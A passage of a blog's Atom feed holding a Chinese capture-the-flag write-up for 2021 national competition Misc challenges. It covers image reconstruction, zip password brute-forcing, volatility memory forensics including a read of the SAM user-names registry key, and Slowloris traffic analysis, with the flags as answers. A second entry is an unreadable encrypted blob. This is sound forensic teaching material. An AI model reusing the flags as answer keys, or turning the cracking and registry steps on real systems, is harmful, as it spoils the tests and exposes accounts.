    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021年第六届全国网络空间安全技术大赛Misc</title>
    <link href="http://mklkx.github.io/2021/05/11/2021%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BMisc/"/>
    <id>http://mklkx.github.io/2021/05/11/2021%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BMisc/</id>
    <published>2021-05-11T06:15:21.000Z</published>
    <updated>2021-05-11T06:35:05.293Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021年第六届全国网络空间安全技术大赛misc">2021年第六届全国网络空间安全技术大赛Misc</span></h3><hr><h4><span id="rgb">RGB</span></h4><p>一共得到28864行RGB数据，</p><p>通过不断尝试分解64 x 11 x 41</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">x &#x3D; 176</span><br><span class="line">y &#x3D; 164</span><br><span class="line">img &#x3D; Image.new(&#39;RGB&#39;,(x,y))</span><br><span class="line">file &#x3D; open(&#39;R#G#B.txt&#39;, &#39;r&#39;)</span><br><span class="line">for width in range(0,x):</span><br><span class="line">    for height in range(0,y):</span><br><span class="line">        line &#x3D; file.readline()</span><br><span class="line">        print line</span><br><span class="line">        rgb &#x3D; line.split(&#39;#&#39;)</span><br><span class="line">        print rgb</span><br><span class="line">        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))</span><br><span class="line">img.save(&#39;rgb1.jpg&#39;)</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>水平翻转得到flag{c1d836d1db9d42dd}</p><h4><span id="zip">zip</span></h4><p>压缩包ARCHPR爆破得到密码【ff123】</p><p>得到【readme.txt】</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">培根密码</span><br><span class="line">BABBBBBAAAABAAB</span><br><span class="line"># XYJ</span><br><span class="line"># xyj</span><br></pre></td></tr></table></figure><p>【文章.docx】解密后</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>全选上色</p><p>得到flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}</p><h4><span id="memory_1">Memory_1</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看可能版本 </span><br><span class="line">volatility -f mal.vmem imageinfo </span><br><span class="line"># 查看进程 </span><br><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p>观察时间规律，发现曾经打开cmd</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>然而</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><p>只能看到ipconfig</p><p>发现文章https://wiki.wgpsec.org/knowledge/ctf/Volatility.html</p><p>尝试查看cmd的详细历史命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure><p>经过多次尝试，确定病毒名为</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>flag{24060da3d327991115a96e7099da25c3}</p><h4><span id="memory_2">Memory_2</span></h4><p>看一下用户信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p>在最后发现可疑net1.exe，</p><p>flag{45321c07f425d915c55424957353dd07}</p><h4><span id="slowloris">Slowloris</span></h4><p>1)小白做法为，</p><p>统计-》流量图-》遍历所有ip</p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p>md5加密</p><p>slowloris/195.8.178.227</p><p>得到flag</p><p>flag{3fc9d4a929cb690728d2b76c76483abe}</p><p>2)一般做法为：Slowloris攻击为大流量攻击，通过流量包查看哪两个ip之间有频繁交互即可锁定</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021年第六届全国网络空间安全技术大赛misc&quot;&gt;2021年第六届全国网络空间安全技术大赛Misc&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;rgb&quot;&gt;RGB&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;一共得到28864行RGB数据，&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021</title>
    <link href="http://mklkx.github.io/2021/05/04/ISCC2021/"/>
    <id>http://mklkx.github.io/2021/05/04/ISCC2021/</id>
    <published>2021-05-04T11:31:22.000Z</published>
    <updated>2021-05-10T08:43:40.683Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b7670ce698cdf1f9d0265a09de785434de467d8c8b3ff6e9a64c3835d6d2cfcf">66d5c26a6f6b22be7e22414f60c9baee1541f2ac6d54695c3f713ac29faa9fcb0fa825c14649efc28e92229c872882fa18d1359a1c4553bce99a775fdfe00e827b36e28e530539cd6ce6d1237ef449226f5414b2b66b7f772a7d693f55fa4a5c4309f419f1f977170286bc0a172819ce49ce2e37b5b1a36ea8520688129a16d4a02e6f9980ce44fea7516a94825d90435ecf116c59b94113d43cece52924b66e9758d9775796492245b7439df3669ea6819151877725218a5b6f95bacaa43a9ebd1d92609408fb1662883b585ec81cb2553047c732384d50fcec8c5ae11158a63808353e957cd138b70a617a56f678b7f6c59cacc4f6b1b8a2fbbbc18ae6ab0ac2fa3e7c5cbc1cfacee50318bded3079f8cbeb51f52a2f73c5e9c706bd9d683015394778eaf9549348a889647704d510e9c8d65be8842ccca58fe560e14eabbd54fb41bcabe61d741189bb17368a3d6f8a03085943d7ce6b819844bc96897ea3568d1c8a9464db1afc6a31df4fe5696cc5ace55c897fb2b4608da0b7d6c2a720fdf4e92fe9f14900c93586d509507f21ad8fcb9f0bc186dd71d2d009c553d8084595408d35efeaf2f7406f5f50cae53f4697260e5c9aecbe0db23ff802e942e5a4c3bae9674c7a67a2fda63655369b08f7803621663c12781477a544a4dd4176f17251efc721df2af54cfc6f33df0dcae083d1a2fb5fbaa45967821d304f50eb2dfd605cf225b5df98541d445004ec3bd35624b3288b8dc33b5fe096a73c5e01d9d468c283a1255a9ceab2a319921582872b2a4d9b4cf5d3ac88343aa8ed26f831820a8b48bb12dae33c96b2878f4954b54df5e139cdeb7aaa7cc4e2f2a59aa27ce90d672857a8822ad06f6018915f5cd715aae8d11bf6f9b8dc27325b194273d445379e638a14dcf6e416f1c8e48e0f3dc28cc0e07f5a16cb25354554a3046e3e0f9cce70c040fef9b2af46cd1eb767e0920bdd262975967cf34412b11df2fd920cd86205b1520c8113cef344cb41d58e175d73715a04b682fdaaa0cfeccff8e0adec54c34ccab255dc000a84a40e8b00f0079407e9cba598a671379f7249bfa40fa7755559af7c1c526d22b2dae3e5a52ff95cd6e1b168fb4bcaa8c7ff1422cf6e96be6493ec9926bd66797a1bf2240b3324d82bdc94f3728c297b743f8f38a08b265a91668fa127a97806036e6d0e028bdb237cf8bb4fea6267072177ece53cb128cad17e197e1b0eed9023b175dbf5a0fdc6806b16d7cd37ac7f8ff3c6a3342233bb2e0b73433bfba1c4715acc4c578bae2ce9578f00e5e1dbd50e73212706bf31dd80849965de0f95cee38d58e24f67649a40574e5343bb659c5df8ccc3374df7f62652fbc721cf7b468271c46f1f854b84d3fd583b13f490341f479cd14a40d589827750d44f7a30301135497454fd6cdf4c898e6c2f77d46242649449969a0a58cc26ff553214ad2712589b01d372465c62963e45671002ee748077569a0de24a2a08da747cece90f9d28a4104d4a76ed704e072088e61547d5d8d5c3b302be6261c2894099fa4b2a63173ac8ae056357eb6ccba6a28324a11534adc708ecfcf88fa1994208b5aef623619d70d31aa9c2664b1486576eb46da377eb879fff013d1ed5ab14501fadc9269efe0f1f5e62372ad197b698fb5ebc5d33109aa24492b44770d14e7d007592f7730531d21b27b2eae11c3b7ed43cb1d97ef6fdf57af3c17a41fc1822db93f05217f9d714471d2f64d5099663d63359e851cf799aff36d7d27f7e4201ccc20f885b47da6d53f17adfefe0021d0bd5ca1c23ff8daf6385b54826ba8c69f88348af04fe31e36cd9d3bc89e160dbbabe77b73b71ae970ea8ccf25e649a86cab073652eedf422e0c32af7154a6090c426561fac3bc4e73c1a716aac79957b22fdc00185a629125960c8192bd99dc68e315bf289debcd6764d2521e9ffea759e9200e62dd942dceb99420ac373aa953676101c41120da4e2695a86eb0cf1783a7d41f2462dbc70c1d1e8f4603459bd82426be2518d9e8295aa2ff0eb4f677d0e20b8f9db794807c7dd588188f80461da18a46e83177567b2180bbca6069e7a2cd776050632d4455ab6eada70409c9884d6fc5155faba394028b1f97229a5d0f44e3dc536c504e7fbe5b106265958c7e605c03b7acf084b11b74b4c8718e28e1b12de31a67cb97bd146d0c61cec4258c332ad0e1cb6bb5e7dfa11da5c5f75d06884e0fa99bd3b24e90226e47dd4b72fe5c19e99b840e7348211618dfb2db761f430500eb24dca1d1c780041910c8a1baa7f5d29dbb3fed61ccbce989c21b20e90d1c7b0de789351a26adae388567b0aba01313c3b05eccca13c9ffd513e8d717f49239b0f63e254035759ef0768df6d9b66e825a7363360770b76ebc4295f680299e4c19556acead044f003252ee1b5ba6f926d256522ec0d46be3e99615e7b8df1555359b8df6e81d6cb125575eba1c9d305a553862bf64dc1daa239b19ee24261a4cbc6c7695f36d290a92760fa19dac6502958b11623e0dde255f58be51ef96ed9320d9f3d080fa9c64dab54014e96b098c795a0b3b5e10ade4a4ce61f7d7fcc80c9c59a21afde4bb0e3aeb6bbbf646718ee1e1f31985d0067a249d68b2960f1371933c862d17629a088b128063e1821582932379e13ba93a640ef5beef4c8f0739b83c22f78b5b9233bb2688528bfdccd751b48b1d6393ce78355eea1fa38e7a4f4af9415ae7fa954e2e8a584dcee296bbca68c12ecb60e09a1ac6ddc56efd8f336dd8c35d8335a8393c446073f1937908c6863df5ee61564a88d7bd177fa72a7c976da38fad918a698ec5f027934c848427eb8b1921412894ebcc85891f034676357351709c3679a01eaad0c489cc2016bd83df53fe9b2458ea6affb4de893775fe390297e3d3f15dde19013b05ff02a85c9955d8870e9650ab129c75974000843d2f3d016351b59bf4fd39082e47bfa470ecb22182c9141e96702a0d40a4d0e760054434ef0d48bfb9ec7eff17a365ddae14fb7a489864c1d7cabc7ac122f3382d0eef0e4aac109a5e9378472428c6ce1f803223c38b3a741fef70b6ad19c4493fda3a172176195f6892a346a6a1680eb8e53d1d0d589f5159c05c56ae5b4ee5a2841513cf8aa6847eae53a4f6d275cf0b3f38bc98e694ca515006f4a75e70a682b77dfc0b6470769ffcbfa213852feba76a4764aa215a10c4cbbc28d84d99258b2c17a5382d41edff7817f566a7aa755c842601a5f2831b4fa952bd15f418d7654287b5ce3c53791c787b4679b853dbe971a7eb0d51ae07e04ca55529bfc3d318d2c4e51aebd27fc42b926810085ec880b59f2119c2d59356782bb93c8828355d7d1059cdb1c94a99ce23f6a1b35e0e9f958f3f1db7c8cc3b22a0609f5deeee7ff5a987a7708cdc1e5dbf0ae4663de27c445973d3e643a9112f3550c97e9bfafa8998b224eced0a8943aee59e5e026be0b290a11500d729d51502a460a612490fdabf4f301a9d1e0986261f37da6c6b6c6b03d980feb912312d70b1e4cda898b52354465cac4c73659c480bbec67c507064d68b8e45b37cf7d4cc32fa7260bbb9bb6d54a9ca5c4593636cb4553c22f68f72234d9638e4933fb3fde05f438ea5798e3915e6fab50a95e35e91fff4c37b1525a22dafc8487943014a91c51edd87a572f1c78b21266acaaed983b7b1f5cc126f3ee1378983b73d18edc0aa78b0bcde821ed4759d4ee283d50647108ffcb04c9cfeef2bb5f53a748838be5330fd77d851cb8afee205a10c42328d7f09eadad419efab958e35c248b27df9e8227b6108818998e8d5be4a806660dc96b073b18c262bbd89494a1f70b5715c7348892deceab22c1c8031a2b1c505a2040262d05a53aea901c620054e0c3d29a0b5fff9a5bb895fccd3717720a52a34c7bddd93a54d7c1f652c8055594120c1a0900fe3231e39cb648411b5894bb2e65f9a916ce22fc397faa5c38deb5286dad4fde5d311ffc2352fecf51a170a93bdb12d9c8bdb7027aba454d2746e8b91e93e04bdcf0ad880a0de7a8a2b66b56e3e8e4342a36b2f94f204616219e1a6ac7cae7eab93ac518820171853ba40738c0b76fa6224e178eb52255672805514be776523f04740fe3a2cef4d1c1d7cb9cac214a821ab2d49ba5303c4b651593efe0ec19870d97e3e705fbc4b27c868bd617e3b2c82720e6d6fd9e9ae40b575110695a39c9e0cd1243aba64f70cef77022705d1edd67aa56f4ff81fb31d6cdd595b9f3761ad5f1684800190c0f92044420057a07755a3d67de375d2abb9a548ff638bb0f3264f58ce504e7f0b0fe3bf73fff83f71a2c8878db20f01cb778af69b88bde70f37d90823a8b671fb5fa13673e40ed46c804327cb81c255b018b7bc74a47965a76f63c8ce0261801eb68f1a0f099f8ad076de91be3448016de40237002e583db2ba7dab6c22489bb452c50d66fc2b7ad0a06acca4829983484a8a48b54d643a6a98f2c602f9766f51c9cd2fce30932bee8360665d59ed295c76f886e59c5dfad16e44ff37e4e2f3ff23c63f797a44ff70728d37305b5a514aec7972391ad853def3aa6fc60b1dfc3a1714380bca507c9e112e395a9cbe4f5c5f8e981bb551c2c0df56ae39f4d58799bdfef633857de1567b2ae494705637e271e56c84008c7a1398fa938470a7e266c508424912caaa4b34694407c987c6c8e693c6fe96ced7ec792349f81c37579b9097f41ed1d8883372137dcd99312c71407e491b459da2bf98631b49c3d3bcb786604159af35ede0158d04e98665e5b43260719ac5e55baa8257ea0d1303dc24853690fe1ba9ad2aa765bfb9d808600da5ee4307d89465200f94b149e2729816046f57e516bd71cfb54d72c05772ae2b816f26d9ae8298b789520f8256d95a1ef9d317da43e4a6245b3d759059663af1d76a45c15b8bff718872b3580dd5ead3511f7c436113b00756268b52d3de9331b3be5102322682805503a5baa7358413955ca473d9e29f92c38c64e708c073904e7ca9dcd37adc75e180d2ee2eefaec5fce9a30a8c5f777044e0892e27c3a9c3615df6293eab7dcf45037584655880fefe31fb28316d7d5a6e75764d196a35f382d3090b15c91661f4e36a540b61a02e73d4ebe485240700b30ad94e15f04cee7d96865cc526819669d88d267e833dcdf2703fdc022d7db44d7f4cc38058470e96ffaadf889f3697085956d69114aceba8af4dd6a83d2f80b4940aacee76bd4aaac413e6cff912c7fcd3eea25cffc65acc4a89287071b7b7a47a41879ff4346dd73269fddcd76fcc19f725c31398aa4d35c979459c7f0d5eb1e9605f5b7c5e0b3e02f0f38a726e4fae3e5e6a8a0caab36c89fdecd5a52bd029f6f85e9976524c3ede1622fa87a1414e40cca0d96bb3dda3ef13181c8331214ed844f297b6f8607da4e6653a8c4c5d387d19ac2bdfeaca0be7421f77698c23a066e28c3a4f786f88bd63a57b643a57c8826dd4a4d0bbe317167765cb6ac7ffc13544014637bde8e1a2bd0b3f27473d88cb924a829362dda040d99ae4c579a2723cde4ac21db1f674711f6893d9dc6301d2cfdda5e32d7954778388bc6dcd829c3ab7ade93051ee5003b843aacd13db65ad717379b599dcb044f061a7aa064466308675f95c1f027521ccfd0e5180c8ea890099e5401a1cf02573c83a5a999f9fd89cb510d17c2f61dc8fa44e8e6612954db774bb8f9c41a70c627a7273eb08fb0d6c811b8631e193e04f765bb9a238d5151cfcb61313f11ffcff43c57f62ce08844630d53af303b22c462f7f3c912a1fda961ae5513d257d061c964eeab904c9ea96fdd56c78c0f41541842cbcb27bb3287253abd0cfbf3fc75da7df85f57cfedbb395ce79ec6d61de3752b59c58062093da4246f8405fdea4ee92f5ed89893ed8de8ee9ec8d1a3a726c5f86db62a3df62c6e1f5d1b859f3f6fc107742e8398b22c96a763f393e6848d09cd1d9aae4c6b987ac5c822e4941022a1143f464ed7de640113d1972342cc1a9fe612d3ada933ab2bdb9115f316d57d8a825433e885e397dcc76b93be29f573f98fb40d1ff9863b2b62960690ca534033179b69dac3b3792e52fee2edb583709888933d56a1fed62ab473462759597d5c762a9f07e78519d07771d227c73e542e1d233aecd1239966724efa878bb8276084fc69b0ad661584521d11d13b836d5d89c86fef6be0bd32659c3a0de16cf34ada2712247b23e70a8f1b6491e27acced4b04e152d5076893e46155ac4192fd06b62e6668f9e10e366b90e22a77d71c49620e6f276d0c736a5c7891f77468ddd605f6d57da37fd33b4e5f4463678dcebe54553ff228ada155b50bcc1c9b044041f772104d81e1521a4b10817479347cdf634f95f0e1d5aa0f27209915fb281d56e154c8d14c7af57b4936ad360d983015ae5d407cf4f1e6bc541a6438695b692bb3d57f01fc96cd1c1ce3c083d8392c924766272e390a745e8caf965a10ba433793317d2e59a8d1ea70920ab811370612abba62dbc70926246d58a83848ff2c3900086c55ef848ec50a2f7277b4f727b28bfc93ac22bb5f510cb03e56ff5e29582bdec1eff80d4bdcc73f1a719eed29ab7abfb423b724e2739b8a06a0080a53d05f38f8884dbfb7871e1e8692cb607d32357729c7bcd0128d2c1626c4ff3c31cd13ee31d6bf508b8ce071beaac3d47073afa6b111b64e3799a3dd661d48a16f96f8ad68c6131ef446c76f20fac944ef21e74cd53892bf39fb326dd2f3009f23ab356496a466e2cf1a88396d4a2b05437e545706cd12baac9e6d630924b0d5cfd8e7ea8e1fe5c62701cba86d9a57a7d2514d9ec50ae4fe01cea2b11be8948214e1d3d0f5225655773391fbd2bdc82172ede8d4a5fe1f4d98e4fce08f135468381e76c3d8cd6df93c6fe44926877ee83083f10c2367620e1f4afec465cf274203317e5afb7f091383d862791c0039bf592e7c2e1c44b5c27796dcaa11a33338e453c3bee9642c23e700c06e8615cb94150da7121b3c37198603ba5c2673bd3f5be1197b47403741acdadbf0f0098b0472de623ba1566e721532a90d180202eb403e6126d85b27d00b11c1c54fb873d0d7297214fe1cef8e8122d00dc26a741ef3b69384afa82a5269b65cb09a7fed3894b68edf0e8d81230d6e3eafb4a1108fde4e29dd347b4288f020af74e7c1f9470a3b36bb0c528e5c4d1099913bed4687c699e1ffe7adfd063a103bfed6656ba22a8e3d455daa40853cfbe67399b82cd5d8482c63218a7f1a014ba070f1ba484026ecb8a2e97de44cff66d105a7df0a8e45de61d96a055eb062537f5e938467bf364b227177c1396ee524b3f64b4ecba32ef228e5b180be4cab724defc6195ee0fa093acdcf2b77b1f075036279d00461e6699b638d8ec6e72a5130b052a11de809ecb7fca753fa47021caa69c603ca098e9236220bd2241bdf01e401220b0b443606e05fccc18adf04fe70e5ea35af4d349ae0cdabbcf17b6ddf7dd5a2bfdad3a3f5bd4e4c546a3877f96d7844ebe2231a2ef10c88ae295eeef9c3b5c598f6ebec78278965dd14adcf82d27812ab4a12a517cd6ac8d975fcb34a47c77aaa647bdd955c5607c23eaadf4f1c7efb855dad9d0667da8ff1066d9e07d2e89d151e7498ccc53c3b4b7b0596e2e5ac33c93099c89c2e9ae4eabb021cfdb5edc8b3227028935eee81f64d69769a4ad09563f8cfe30ba111229eb39be7a2eb68714e4caf6e3d3a716db4f7df44eae32cc5594fccea1e457ccb105ac47c405c420cd0b391dd3d524802c5ed36bf82ccbcbd9915f044dc36525265b0c500c236ad8c10b404ecfbc4170551d48cd90cf94096495394a4be4edd7300f9dc53382d70b5dfb56b352ba9c7ad20e660d6f75d8c6f60a7d6010aabdf845d8409736508f40077ee042762cd4038d745b13b14cd32be4f3bf7846061e99ded0e29afc6950f5d33c1d081bbadf0ae64d5bc75016356ec6896fd5c338bc6f6a4eea49a2fae4b48d02c4043ad02d5fad9adb90b7dd6b4fe3a6a7366a613db663f1ffc6d8e99cbee3d38f422083af8e2b32c63b1eca708a27a051b52ff046f5e6a744e1e6179ff15f069eca69b6b5bf9c25e1b1a3c9d7edf7fc55243da9d19681a361b54c2670d5b04f764274a19cd875430c09497611acbe84faf6e7c38d39e2dde86851aab69a35c1d102e6f6a55181a9718cb797925bae1be9829cf232324c79ffc1970df5ce0b6a83debb7be5259a8392371ac53d87b19815e412d4dae0cc25b1cc11fa9c15db80dc8963b7ce7cb9f35b202ef94d392a1d2485919121bbcdf46ff65a253d8028550f883f3430b526abc8099a06bbaaab7b24232d1c787b00a89bd90e1465bf7e58763bba1e3e2f65132d8b4044bd5509ef8334424c90924e18e886d9030ab2cf78d51ff6630b21e45e0915da6860136301f384455aedc0a2047674627f6c0b61dc9a1ab059680fcfb3e5dd8bb3c65eb304211f864960a22555636e6cd30440108688244ee2ea99f9fc8219767924c093e4b5fb97d093c9fd89955b4b489a919d84cd406788a7593973c2533e3bcdb157cda0ff0c279e4d04c2290833eb251614beea2c7196eb6185c8f6b01e9101ecd86b5abb012415b61cbd4967aeb1505bd64b99c1a4e97bee1962ba5033a7704c8320140e8155df3897d7b79282263b19c645f7a506b9ba7b3548ec95208447848354c00a9224d0f4a69c71580ed5e37af89ba0d05126b876ae6bc4fa7c540d98e2dc7f26b80d603bb71b1da3d61cfc3e2bc313bb813b44365e4512a109afa7b7563351d5fda20ce98391fb7e3a1d3ab693df5b3eeb46d2dfa8b354eb77f366fca10d37b4879cc820c70247aceac8cf8d27970f409bcccd58a4e3db795658abb04ea8658f7969df3ba0bd08a59bcb2b65941f744042ce037cc5067ed2e2c00d70c1889f9dfc6e6950a8696ae9cde7f394fe2a126c995f210ba2eca26b3e1e1cf94e222f6ec4b9c8ea253c73f397362fa673d77094bb46e7e1034abedb33218bcc53112d1bfda9a7622fcb7c76c08eeaa3f9f7f00f9d0e7fafbf4bd68d1ac1f0b86693053edfd65adfaac45202b4228665a25c30bb68461e0b0f2f2d73cef5a418f9fd7a1a383b44a69b67e183c6b70e77b1cb1da877705a0398c986bb519898b8a83baef6c344c7d93b730e506619a10df4fb90ea6631f9910b72d4094456749d49cea1f3cdaf9f8f969ba50aac658976ec98d099936b4ffbd4fc2dd6a1396a03aba6dde22291a730d75c5e3fbd75cf2373ca68be92171f5cc56cea6ee2899175ea7132e674e89efa33a199a1d335e42d40e4ebe8a8ff0328b14fb8944584e853237263c03cfba504db41bb575d2afc90950946098a9ec089e6c83bedbdfb5c63f57d21499f3ae592d623a22737f85edd6e56359f318a801c5852d4ee47e92376e3948be9aff55748eeb4f05fa873da374e63a7f7098871144b573d43f6aed0db3f53915152cb5e4a966cd60525094c1ef3548fa4731177f2024bb6f6d2b7cdd37d42baa39de52bb552eabf40e45eeb47097ee44f18186c99b2d77ac7a2fc0b82bd763daed43f42ec320bd33c03938e05301c70321368cfb96caa5f1b94f1be0fea95ec81b63ddf43eaa8354106cc0ebbe50ee932a98c6b58a6d60c09cf141e8131b7ad5c0b5f10c05869cb9cf1abf87490f6deb0c4a0f81402edd1745e3ac1b1f5ff6dafa929bb89283e0d63789aa71409d50eb0968d86a2c10f70c5ecbb31aef3814d81402d21f6a455a3e7091ee187d4b627fa31dcd6472ced265c5e51ed4749afb856080ac62b122fcb9fd6d205fb87fba4024551d5e22525c6fcc782caa934fe14cc79a6dbf2766667e3ea1c6a1644fcb329b0ea955eaeae1534a9735d8e491820e195212b0a20cc052cf48576573f4d3703eaedeb87c1a370403708b741109bff71d939b9a12bccad523756efb42392262f2f8ad8752be6243fe0ff01ef29c84d26eeb65ca9f02bffdc12425c4e8110f04ef775c028d1440b0046b3a9972034e3c042b27f58e9e0411e99143975c3a921c02a5bdb6202fae663571b3053073bce2951c71145aac9009940d37910d8967344423a06e444742e841751cebcb1f7280a232df58460ef2e2a6ede658dfea75b5bb75525aa72485de269676b2674140aa37a6d73fdf72bd0daf1f35db12bc350840ae090f2ffb868f75ac3ef0fea0d0d559652b127a5b7bdd5f53a3a08bf0c8d92f029125dd3ab225b90cd896a7a9b0b432027a4836b15a797ca8310963807089b26c8f84ea107ed43b10f4f42e05dd74f5a6f4da9ac08cd2dae86b20ab6fd868f5717d495ebfb33451966f9fdb17c33ec38aed05a8c92a14b29fe69ab9baefe05dd755596144c9ed5d3fbf753c315d09731252c7062cb2adfac7f7304b4d1d1abe69351585229953c54533860a4f2e0de8ecefdac1d17c356792615cd4266118bd5f336a6b3eca6a9f0859749413906d0b7f4cd80ef3c75dc4368efc1190ea89dd97fdebe24fed74ffffb14025c9f38a99b87b5572009c5c07368db4ce3a58ecef3336f70ca25e101207f95ab022c8e482aa31f257a7fac6ce140caf3d3f95f31d5b7600165c30b3b146ed5060adcedd9da05fd1d33a76b14779838655ee8636d65af625a13a7d342e4ff365ad6e33b323c5fca3597f60e219aed0a60be607a9a9bbc14a590e539b48220722603ef295b180bd2bc4bcd0023b22015b336b3c064158e05aefb87d2c2ba00c001ddc4cd509b1a804e5042a153cdf1cafe1539c214e99367954f00ba334ddd1792052122bfd0b8bd95842791b804627b629e3b7e970c6fd5e2bbcaf8bbfc3b2c97d3e57181c22ed8cbef8092a1d213f8112015e35b7903764ae9aa6ce62f3f7ac5c4727d567cc3112129dfd10065d9a86cc779172f46b2213f11a47ebddb5c598aca9265b8b2b1adf3ecba338fa0d47cbb377d490874f7f829f8024de7db25a32a77f72825ab422986fbbfe83129184e90cd71d77d2b859a35dfd66ca2d6f44adb6d4768efd69bdd46fd5ccfef0f50b3afe63d022528322751671e55abe9967a2f025723391fe826cd76e8bf608eb0db97b0739a657922e669a7ebe67e41500a5f78d8568fde92ddfa42996e92af7c78be2cd3074c813942cd116dcbff9fa54129c406fdb013687492ff24f66ab1c36429bbdf9695c467b89d3616ae84b2c89c89c68df7ce8dce2c3b32f0d85ecc03b524edc226765d5e901ae85a18e819e8b8b1a72e7439f397722d07d9e1ceab8ea4965dd269f36fe8ab8d8dd31d07a63869efd2c29a3efd0a720b20a5230ee45e5c86640039a047cb6af85720efc94556e9c78d166404cc84be54e0784f5a944036119535e75c6f00ad9a66a04291664c7fd792b789dce074987593deb2ede88b39f771baeda8f9b886ab2121b96821cc02289f8127b8f9570ab5c9345c63d97d1c274363041e91efef9241f211ef5297b67d4ebf5a982f577e71c31d6927549c52800c457ed1570a2ac3bcf317e5fae6e9aeeaa4a3f51103f101700d77067b643da73a22983d2ff6311816c51ed5e8468d694474f898273222788280050bd0662c93da5c3aa2fc2e4e5dd3cac93c8034a024abe4668300b27c9c70cca16669c2a788e4aa175ed962f804e8759c2e8f46a76250e684754da78533a8560b808fa544558b1401bdc55b636cc50597023f34394485b285ed1db02fb51fd4a200befde5bf93cca4daac56500d49d596d3da8719e10d5740f9d60b77fe5762a644eb3404036527abc28337ae3238c77dd44892fac4e7be5b39c917449cc7484953e1e0c627adc61e63bd16e347e8c8d76d64f19c39c363065a045658c0fd4588ad6edb432a720105ed18ddc6be852847957cff7f75cc7dd4ec7e55ac83e6a2a43057e6155da27f17d838fb85a8b5dc41d13538dfd577986b9104da78cc3636f81496fd2c2d226113c05c5c7421407e00de9a4e41bfa2c7c42475a0161d34460a36992546d237f4640ba0d7b84092316f634b2c18b7083adf8478ffb396008fc714ab44f37a254034ffede98c89b1a1297498868b428b3a781b801a3d8a9178c7bc5e88cceb57588c10055d469598361e9f57cf869cbbe9f1d3ab5c87ea14ed81350908d5ab9a99f3663741f9248d72da60c6dd597b5558a2d03a860a1a19b46e9e9844cf2f87087428baf9ae006120ee0cb630955434f3b3a137594a1161ef44191c874fc9fa0f52a391fc6dfc5e71b2ebd364f1e6244330630a600e5e18533c9a3a0cb010bdd5e29e15fe25a238c709dc805272d9ccd6519ca4cf3d572b6be29b6b2795f36b25f52bf097e9c68c1a502a9b46c77f8c5332fa00b60f10e6c1ec6bb7b05407b3b5cda45ab2836657622fcfb5b2ff48f0093c193315deaaa8205f7721bb5dd9f25759f6ec64dbd63494121a50c9dbb25c9f995bac543e047b2e42d40a347755fec677b02e6f6c6fdd14388685db146b031eecf87205d9201fd28e8bd30d37c5ea18f836ce9e22e0139d26e77e6d70c8579c6f95cef7b91698bd81bbb4112e291bc7bd8db153934379e8492dc7729af4b856dcf55a9d1adac7dea680b35e643f15c057bf9ffc93414fc3a607e67358c4834f0701e99c058db24fa2913ea197cba294bb04f013bf4b9246cd742346c13d1568577a0cbe146bcc07471ee8fe7d971440d1f686990dfec608715f608817dfef435bf70e72a0930353033659353bb14f06c99f11054409e2287d82e27b67fa12b9cc3de16b4c65b0a8dd43492f1e0a4463715daa7b3565d26d33a9b4908ba00373acd631d678e2c8e18192c97499db3d8dccfbb4d79f5f3fcbc98ac2b6771d4b325edb8d32612f1cb973b9853890e6504f0abb720ac12af9155508dc7fdde6f8eb7b30093b1e825fac8003ad4c94019804a4a10ce894ae4f88dde7b9d1d426c2a81645b6f80934997a6f6575593fe4a68548dd65461fa34f2794a718008552a5849ab3d1f928e872b9485ccfe7eef0be06cb495756fb2c9ac7e0b12ebf1391e59aaa27ecd7cc988353280bbdcb561ebd8d03ecc34d08e3bdf8dea519118b03b706de21cfc8b27513099ea2aca3a4a19b65982424657cb27270ac782f700163a205fac2e1e034b9cb827fa9327f